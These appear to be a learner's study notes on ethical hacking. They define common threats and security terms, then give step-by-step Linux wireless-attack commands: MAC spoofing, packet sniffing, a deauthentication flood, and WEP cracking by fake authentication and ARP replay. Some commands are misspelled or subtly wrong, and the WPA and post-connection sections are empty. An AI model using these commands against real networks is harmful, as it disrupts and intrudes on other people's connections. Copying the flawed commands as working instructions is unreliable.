________ETHICAL HACKING__________
Since it is digital era there are more pople who come into hacing in order to explote or to secur the system
THREE TYPE OF HACKERS
BLACK HAT HACKER:Their main gole ist exploite syste steal data oe etc.
WHITE HAT HACKER:Their main gole is to identify valnubarlaity  in a system and try to make the system more secure
GRAY HAT HACKER: Their main gole is to hack into system just for fun but it it si still not leagle
_____________________________________________MOST COMMAN CYBER THREATS_______________________________________________________________________________________________

1.MALWARE:Malware is intrusive software that is designed to damage and destroy computers and computer systems. Malware is a contraction for “malicious software.” Examples of common malware includes viruses, worms, Trojan viruses, spyware, adware, and ransomware.

2.PHISHING:Phishing is a type of social engineering attack often used to steal user data, including login credentials and credit card numbers. It occurs when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message.

3.PASSWORD ATTACKS:A password attack is simply when a hacker trys to steal your password. ... Because passwords can only contain so many letters and numbers, passwords are becoming less safe. Hackers know that many passwords are poorly designed, so password attacks will remain a method of attack as long as passwords are being used.

4.DDOS:In computing, a denial-of-service attack is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.

5.MAN IN MIDDLE:A man in the middle (MITM) attack is a general term for when a perpetrator positions himself in a conversation between a user and an application—either to eavesdrop or to impersonate one of the parties, making it appear as if a normal exchange of information is underway

6.DRIVE BY DOWNLOADS:Drive-by download means two things, each concerning the unintended download of computer software from the Internet: Downloads which a person has authorized but without understanding the consequences

7.MALADVERTISING:Malvertising, or malicious advertising, is the use of online, malicious advertisements to spread malware and compromise systems. Generally this occurs through the injection of unwanted or malicious code into ads.

8.ROGUE SOFTWARE:Rogue software or applications are forms of Internet fraud using computer malware to trick users into revealing financial and social account details or paying for bogus products. As their name suggests, these fraudulent programs go “rogue” on the internet, appearing in simple internet searches and on social networks
_______________________________________________________________________________________________________________________________________________________

Company try to to protect there data from Unauthorised Modification ,Unauthorised Deletion,Unauthorised Acess

ATTACKS ON CIA(CONFIDENTIALITY,INEGRITY,AVAILABLITY)

CONFIDENTIALITY:To keep the data confidential and to get it to the right person it include cracking encripeted data , password prothection,malware/spyware
INEGRITY:Mantaining the the trust throughout the the period of action 
AVAILABLITY : Goin through regular checks and Mantaining the os and removing the software conflicts.Securing the data in case of an accident (fire or damage to server). firewall to protect them.
____________________________________________________________________________________________________________________________________________________

STEPS TO FIX CRIME
1.IDENTIFY the threat that occure in the system and the valnurablity
2.ANYLSE AND EVALUATE 
3.TREAT
__________________________________________________________________________________________________________________________________________________
Vulnerablity ,Threat &Risk

Vulnerablity : it is the place where the system is laging behind and make it more valnurable 
Threat : new threats that are brought like natural threat (foods,fire), unintentional threat threat caused by the workers in organization unintentionally ,intentional threat 
Risk:Damage that caused due to the vulnerablity and threat
#visit threat cloud to look threats that are ocurring 
_____________________________________________________________________________________________________________________________________________________

CRYPTOGRAPHY:Cryptography is a method of protecting information and communications through the use of codes, so that only those for whom the information is intended can read and process it. The prefix "crypt-" means "hidden" or "vault" -- and the suffix "-graphy" stands for "writing."

Peniteration testing it is can you get into a system that is ti may be a physical acess or a virtual acss it can be done by social enginnering or exploiting th system to find out valnurablity





_______________________Network hacking__________________________________________________________________(LINUX)____________________________________________

A)Pre-connection Attacks:

Requirement:Wirless Adapter (It should support monitor mode,Packet injection,AP mode)
            Recommended Chipsets:RealTek RTL8812AU/Atheros AR9271

MAC Address(Media Acess Control):It is a permanent ,physical,unique adress assigned 
                                 by manufacturer.It is used in network to identify the devices and 
                                 send data between the devices.

Why to change MAC Address?: To increase anonymity,impersonate other devices,bypass filter

How to change MAC Address?
                          1.first go to linux terminal do ifconfig(to list all network connected)
                          2.then to disable the wirelees adapter we write (ifconfig wlan0/name of adapter) down
                          3.then to change we write ifconfig wlan0 hw(Hardwear)ether 00:11:22:33:44:55
                            COMMAND:ifconfig wlan0 hw ether 00:11:22:33:44:55
                          4.To enable it COMMAND : ifconfig Wlan0 up

To change Adapter mode to maonitor from managed(To capture packets)
                                                                   1. iwconfig: to list wireless devices
                                                                   2.ifconfig wlan0 down : To disable adapter
                                                                   3.airmon-g check kill: This command will kill all the command that can interfer
                                                                   4.ifconfig wlan0 mode monitor: This command will change mode to monitor
                                                                   5.ifconfig wlan0 up :To enable adapter

Packet Sniffing Using Command (airodump-ng)
>Part of the aircreack-ng suit
>Airodump-ng is a packet sniffer
>used to capture all packet within range

Command:  airodump-ng (name of adapter)

Wifi Band Frequency
>Decide the frequency range that can be used
>Determine channels that can be used
>It should Support the band

Most common Wifi Bands are:
a :Uses 5Ghz frequency
b,g:use 2.4 frequency only
n:uses 5 and 2.4
ac:Lower than 6Ghz

to Scan bands use: airodump-ng  --band a (name of adapter)

Sniffing Targetted packet
COMMAND: airodump-ng --bssid (MAC address of packet you want o sniff) --channel (no) --write name (adapter name)
The above command will write in main directory
the file we need to look is .cap file
the file may be encripted we use wireshark to analyze data


___________Deauthenticaton Attack:Disconnect any client from any network__________________________________________________

>Works on any encrypted network (WEP,WPA and WPA2)
>No need to know network key
>No need to connect to the network

COMMAND: aireplay-ng --deauth(this is name of attak ) 100000(no of packets to send) -a (target mac adres ) -c (client adress) name of adapter
COMMAND : aireplay-ng --deauth 100000 -a 12:32:14:12  -c 11:22:33:44 wlan0
This command will send packet to client router and diconnect the device
ctrl+c to stop command

___________________________________________________________________________________________________________________
B)Gaining Access:

1)  WEP Cracking:
    WEP(Wired Equivalent Privacy) :Old Encription,Uses Algo RC4,Used in some network,EASY
    
>Client encripts data using a key.Each packet encriypted uses a unique key stream
 Random Initilization Vector(IV) is used to generate the keys stream
 The IV  only of 24 bits
 IV+Key(Password) =Key stream

 /IV is to small (24 bits)
 /IV is send in Plain Text
 /IV repetes on busy network
 /Makes it vulnerable for statisticall attack
 /Repeted IVs can be used to determine key stream

>Encripted Packet is send in air
>Router decrypt packet using key

Conclusion: 
To crack WEP we need to :
1.Capture a large number of packets/IVs (We will use airodump-ng)
2.Analyse the captured IVs and crack key (We will use aircrack-ng)

1Step: Command: airodump-ng --bssid 1A:23:43:GF --channel 1 --write (file name) (name of adapter)
2Step :Command: aircreack-ng (name of file.cap)
3Step:We get key like 12:34:56:78 remove colen and that is password

WEP Cracking (When there is very less traffic on the network)
When connecting with a network it might not have enough traffic so we need to associatewith the network to recive more packets.

Open three terminal

1Terminal : airodump-ng -- bssid 12:34:56:78 --channel 3 --write arpreplay mon0

2Termainal : aireplay-ng --fakeauth 0 -a 12:34:56:78 -n (mac adsress) mon0
Here we are associating with target network

This her is Arp Replay Attack
3Terminal: aireplay-ng -arpreplay -b 12:34:56:78 -h 12:34:56:78 mon0

------------------------------------------------------------------------------------------------------------------------------
WPA/WPA2 Cracking
>Both can be cracked using same thing
>Made to address the issue in WEP
>Much more secure
>Each packet is encrypted using a unique key
-Packet contain no useful info
















C)Post-connection Attacks:




















